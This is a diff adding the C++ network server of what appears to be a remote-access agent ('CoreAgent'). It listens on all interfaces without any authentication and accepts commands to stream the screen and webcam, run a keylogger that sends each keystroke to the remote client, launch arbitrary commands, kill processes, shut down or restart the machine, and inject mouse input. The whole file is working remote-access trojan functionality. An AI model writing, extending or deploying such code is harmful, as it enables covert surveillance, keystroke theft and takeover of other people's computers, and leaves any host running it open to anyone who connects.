@@ -1,0 +1,389 @@
+#include "core/BackendServer.hpp"
+#include "core/BroadcastBus.hpp"
+#include "core/StreamSession.hpp"
+#include "interfaces/IVideoStreamer.hpp"
+#include "interfaces/IKeylogger.hpp"
+#include "interfaces/IAppManager.hpp"
+#include "interfaces/IInputInjector.hpp"
+#include "core/NetworkDefs.hpp"
+#include <cstring>
+#include <iostream>
+#include <algorithm>
+#include <sstream>
+#include <fstream>
+#include <thread>
+#include <chrono>
+
+#ifdef POST_LINUX
+#include <sys/ioctl.h>
+#include <linux/sockios.h>
+#endif
+
+namespace core {
+
+    BackendServer::BackendServer(
+        uint16_t port,
+        std::shared_ptr<BroadcastBus> bus_monitor,
+        std::shared_ptr<BroadcastBus> bus_webcam,
+        std::shared_ptr<StreamSession> session,
+        std::shared_ptr<StreamSession> webcam_session,
+        std::shared_ptr<interfaces::IKeylogger> keylogger,
+        std::shared_ptr<interfaces::IAppManager> app_manager,
+        std::shared_ptr<interfaces::IInputInjector> input_injector
+    ) : port_(port), bus_monitor_(bus_monitor), bus_webcam_(bus_webcam), session_(session),
+        webcam_session_(webcam_session), keylogger_(keylogger), app_manager_(app_manager),
+        input_injector_(input_injector) {}
+
+    BackendServer::~BackendServer() {
+        stop();
+    }
+
+    void BackendServer::run() {
+        listen_fd_ = socket(AF_INET, SOCK_STREAM, 0);
+        if (!IS_VALID_SOCKET(listen_fd_)) return;
+
+        int opt = 1;
+        setsockopt(listen_fd_, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
+
+        struct sockaddr_in addr;
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(port_);
+
+        if (bind(listen_fd_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+            CLOSE_SOCKET(listen_fd_);
+            return;
+        }
+
+        listen(listen_fd_, 10);
+        running_ = true;
+        std::cout << "[BackendServer] Core Listening on " << port_ << std::endl;
+
+        accept_loop();
+    }
+
+    void BackendServer::stop() {
+        if (running_) {
+            running_ = false;
+            #ifdef _WIN32
+            shutdown(listen_fd_, SD_BOTH);
+            #else
+            shutdown(listen_fd_, SHUT_RDWR);
+            #endif
+            CLOSE_SOCKET(listen_fd_);
+        }
+    }
+
+    void BackendServer::accept_loop() {
+        while (running_) {
+            struct sockaddr_in peer;
+            socklen_t len = sizeof(peer);
+            socket_t fd = accept(listen_fd_, (struct sockaddr*)&peer, &len);
+            if (!IS_VALID_SOCKET(fd)) break;
+
+            // OPTIMIZATION: Non-Blocking & Small Buffers
+            set_nonblocking(fd);
+
+            int flag = 1;
+            setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, (const char*)&flag, sizeof(flag));
+
+            // Reduced buffer to 256KB to prevent "buffer bloat" (latency accumulation)
+            int snd = 256 * 1024;
+            setsockopt(fd, SOL_SOCKET, SO_SNDBUF, (const char*)&snd, sizeof(snd));
+
+            int rcv = 1 * 1024 * 1024; // 1MB Recv is fine
+            setsockopt(fd, SOL_SOCKET, SO_RCVBUF, (const char*)&rcv, sizeof(rcv));
+
+            std::thread(&BackendServer::handle_client, this, fd).detach();
+        }
+    }
+
+    static const int HEADER_SIZE = 12;
+
+    void BackendServer::handle_client(socket_t fd) {
+        uint32_t cid = 0, bid = 0;
+        auto client_mutex = std::make_shared<std::mutex>();
+
+        // New Sender: Priority based
+        // is_critical=true: Loop until sent (Control messages)
+        // is_critical=false: Drop if would block (Video frames)
+        auto sender = [this, fd, &cid, &bid, client_mutex](const std::vector<uint8_t>& data, uint8_t prefix = 0, bool is_critical = true) {
+            std::lock_guard<std::mutex> lock(*client_mutex);
+
+            // Construct Packet
+            uint32_t len = data.size() + (prefix != 0 ? 1 : 0);
+            uint32_t net_len = htonl(len);
+            uint32_t net_cid = htonl(cid);
+            uint32_t net_bid = htonl(bid);
+
+            uint8_t header[HEADER_SIZE];
+            memcpy(header, &net_len, 4);
+            memcpy(header+4, &net_cid, 4);
+            memcpy(header+8, &net_bid, 4);
+
+            // Helper to write all bytes
+            auto write_all = [&](const uint8_t* ptr, size_t size) -> bool {
+                size_t sent = 0;
+                while(sent < size) {
+                    ssize_t n = send(fd, (const SOCK_BUF_TYPE)(ptr + sent), size - sent, 0);
+                    if (n < 0) {
+                        #ifdef _WIN32
+                        int err = WSAGetLastError();
+                        if (err == WSAEWOULDBLOCK) {
+                        #else
+                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                        #endif
+                            if (!is_critical) {
+                                // Real-time packet: Drop immediately on congestion
+                                return false;
+                            }
+                            // Critical packet: Wait and retry
+                            std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                            continue;
+                        }
+                        return false; // Fatal error
+                    }
+                    sent += n;
+                }
+                return true;
+            };
+
+            // Send Header
+            if (!write_all(header, HEADER_SIZE)) return;
+            // Send Prefix
+            if (prefix != 0) {
+                if (!write_all(&prefix, 1)) return;
+            }
+            // Send Payload
+            write_all(data.data(), data.size());
+        };
+
+        auto send_text = [&](const std::string& msg) {
+            std::vector<uint8_t> b(msg.begin(), msg.end());
+            sender(b, 0, true); // Critical
+        };
+
+        auto send_file = [sender](const std::string& path, const std::string& filename) {
+            std::ifstream f(path, std::ios::binary | std::ios::ate);
+            if (!f) return;
+            std::streamsize size = f.tellg();
+            f.seekg(0, std::ios::beg);
+
+            std::vector<uint8_t> content(size);
+            if (f.read((char*)content.data(), size)) {
+                 uint32_t name_len = filename.length();
+                 uint32_t net_name_len = htonl(name_len);
+
+                 std::vector<uint8_t> packet;
+                 packet.reserve(4 + name_len + size);
+                 uint8_t len_bytes[4];
+                 memcpy(len_bytes, &net_name_len, 4);
+                 packet.insert(packet.end(), len_bytes, len_bytes+4);
+                 packet.insert(packet.end(), filename.begin(), filename.end());
+                 packet.insert(packet.end(), content.begin(), content.end());
+                 sender(packet, 3, true); // File download is Critical
+            }
+        };
+
+        std::vector<uint8_t> payload;
+        while (running_) {
+            if (!read_frame(fd, payload, cid, bid)) break;
+
+            std::string msg(payload.begin(), payload.end());
+            msg.erase(std::find(msg.begin(), msg.end(), '\0'), msg.end());
+
+            // Log command (optional, filtered)
+            if (msg.find("mouse_move") == std::string::npos) {
+                std::cout << "[CMD] " << msg << std::endl;
+            }
+
+            std::stringstream ss(msg);
+            std::string cmd; ss >> cmd;
+
+            if (cmd == "start_monitor_stream") {
+                // Video is Non-Critical (Drop if full)
+                bus_monitor_->subscribe(cid, [sender](const std::vector<uint8_t>& d){ sender(d, 1, false); });
+                auto res = session_->start();
+                if(res.is_err() && res.error().code != common::ErrorCode::Busy) {
+                     send_text("ERROR:StartStream:" + res.error().message);
+                } else {
+                     send_text("STATUS:MONITOR_STREAM:STARTED");
+                }
+            }
+            else if (cmd == "stop_monitor_stream") {
+                bus_monitor_->unsubscribe(cid);
+                session_->stop();
+                send_text("STATUS:MONITOR_STREAM:STOPPED");
+            }
+            else if (cmd == "start_webcam_stream") {
+               bus_webcam_->subscribe(cid, [sender](const std::vector<uint8_t>& d){ sender(d, 2, false); });
+               webcam_session_->start();
+               send_text("STATUS:WEBCAM_STREAM:STARTED");
+            }
+            else if (cmd == "stop_webcam_stream") {
+                bus_webcam_->unsubscribe(cid);
+                webcam_session_->stop();
+                send_text("STATUS:WEBCAM_STREAM:STOPPED");
+            }
+            else if (cmd == "start_keylog") {
+                auto res = keylogger_->start([sender](const interfaces::KeyEvent& k){
+                    std::string s = "KEYLOG: " + k.text;
+                    std::vector<uint8_t> b(s.begin(), s.end());
+                    sender(b, 0, true); // Keylog is Critical
+                });
+                if(res.is_err()) send_text("ERROR:Keylog:" + res.error().message);
+                else send_text("STATUS:KEYLOGGER:STARTED");
+            }
+            else if (cmd == "stop_keylog") {
+                keylogger_->stop();
+                send_text("STATUS:KEYLOGGER:STOPPED");
+            }
+            else if (cmd == "ping") {
+                send_text("INFO:NAME=CoreAgent");
+            }
+            else if (cmd == "list_apps" || cmd == "get_apps") {
+                auto apps = app_manager_->list_applications(false);
+                std::string payload = "DATA:APPS:";
+                for(size_t i=0; i<apps.size(); ++i) {
+                     const auto& a = apps[i];
+                     if(i > 0) payload += ";";
+                     payload += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
+                }
+                send_text(payload);
+            }
+            else if (cmd == "launch_app") {
+                std::string args;
+                if (msg.size() > 11) {
+                    args = msg.substr(11);
+                    args.erase(0, args.find_first_not_of(" \t"));
+                }
+                if(args.empty()) {
+                     send_text("ERROR:Launch:No command specified");
+                } else {
+                    auto res = app_manager_->launch_app(args);
+                     if(res.is_ok()) send_text("STATUS:APP_LAUNCHED:" + std::to_string(res.unwrap()));
+                     else send_text("ERROR:Launch:" + res.error().message);
+                }
+            }
+            else if (cmd == "kill_process") {
+                 std::string pidStr;
+                 if(msg.size() > 13) pidStr = msg.substr(13);
+                 if(!pidStr.empty()) {
+                     uint32_t pid = std::stoi(pidStr);
+                     app_manager_->kill_process(pid);
+                     send_text("STATUS:PROCESS_KILLED");
+                 }
+            }
+            else if (cmd == "shutdown") {
+                send_text("INFO:System Shutdown Initiated");
+                app_manager_->shutdown_system();
+            }
+            else if (cmd == "restart") {
+                send_text("INFO:System Restart Initiated");
+                app_manager_->restart_system();
+            }
+            else if (cmd == "search_apps") {
+                std::string query;
+                if(msg.size() > 12) query = msg.substr(12);
+                auto apps = app_manager_->search_apps(query);
+                std::string payload = "DATA:APPS:";
+                for(size_t i=0; i<apps.size(); ++i) {
+                     const auto& a = apps[i];
+                     if(i > 0) payload += ";";
+                     payload += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
+                }
+                send_text(payload);
+            }
+            else if (cmd == "mouse_move") {
+                float x = 0, y = 0;
+                ss >> x >> y;
+                if(input_injector_) input_injector_->move_mouse(x, y);
+            }
+            else if (cmd == "mouse_down") {
+                 int btnIdx = 0; ss >> btnIdx;
+                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btnIdx, true);
+            }
+            else if (cmd == "mouse_up") {
+                 int btnIdx = 0; ss >> btnIdx;
+                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btnIdx, false);
+            }
+            else if (cmd == "mouse_click") {
+                 int btnIdx = 0; ss >> btnIdx;
+                 if(input_injector_) {
+                     interfaces::MouseButton btn = (interfaces::MouseButton)btnIdx;
+                     input_injector_->click_mouse(btn, true);
+                     std::this_thread::sleep_for(std::chrono::milliseconds(20));
+                     input_injector_->click_mouse(btn, false);
+                 }
+            }
+            else if (cmd == "get_state") {
+                 if(session_->is_active()) send_text("STATUS:SYNC:monitor=active");
+                 if(webcam_session_->is_active()) send_text("STATUS:SYNC:webcam=active");
+                 if(keylogger_->is_active()) send_text("STATUS:SYNC:keylogger=active");
+                 send_text("STATUS:SYNC:complete");
+            }
+            else {
+                send_text("Unknown Command: " + cmd);
+            }
+        }
+
+        bus_monitor_->unsubscribe(cid);
+        bus_webcam_->unsubscribe(cid);
+        CLOSE_SOCKET(fd);
+    }
+
+    bool BackendServer::read_frame(socket_t fd, std::vector<uint8_t>& payload, uint32_t& client_id, uint32_t& backend_id) {
+        // Read is also non-blocking now. We need to loop or wait.
+        // For simplicity in this Task thread, we will BLOCK on read using loop with Sleep
+        // Or revert socket to blocking for Read? No, socket is full duplex generally.
+        // A better approach for read loop in Non-Blocking socket is Select()/Poll().
+        // Legacy "Accept Loop" spawns thread per client.
+
+        auto read_bytes = [&](uint8_t* ptr, size_t size) -> bool {
+            size_t got = 0;
+            while(got < size) {
+                if(!running_) return false;
+                ssize_t n = recv(fd, (SOCK_BUF_TYPE)(ptr + got), size - got, 0);
+                if (n > 0) {
+                    got += n;
+                } else if (n == 0) {
+                    return false; // EOF
+                } else {
+                    #ifdef _WIN32
+                    if (WSAGetLastError() == WSAEWOULDBLOCK) {
+                    #else
+                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    #endif
+                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
+                        continue;
+                    }
+                    return false; // Error
+                }
+            }
+            return true;
+        };
+
+        uint8_t header[HEADER_SIZE];
+        if (!read_bytes(header, HEADER_SIZE)) return false;
+
+        uint32_t net_len; memcpy(&net_len, header, 4);
+        uint32_t len = ntohl(net_len);
+        uint32_t net_cid; memcpy(&net_cid, header+4, 4);
+        client_id = ntohl(net_cid);
+
+        if (len > 10 * 1024 * 1024) return false;
+
+        payload.resize(len);
+        if (len > 0) {
+            if (!read_bytes(payload.data(), len)) return false;
+        }
+        return true;
+    }
+
+    bool BackendServer::send_frame(socket_t, const uint8_t*, uint32_t, uint32_t, uint32_t) {
+        // Deprecated/Unused by new lambda sender
+        return false;
+    }
+
+} // namespace core
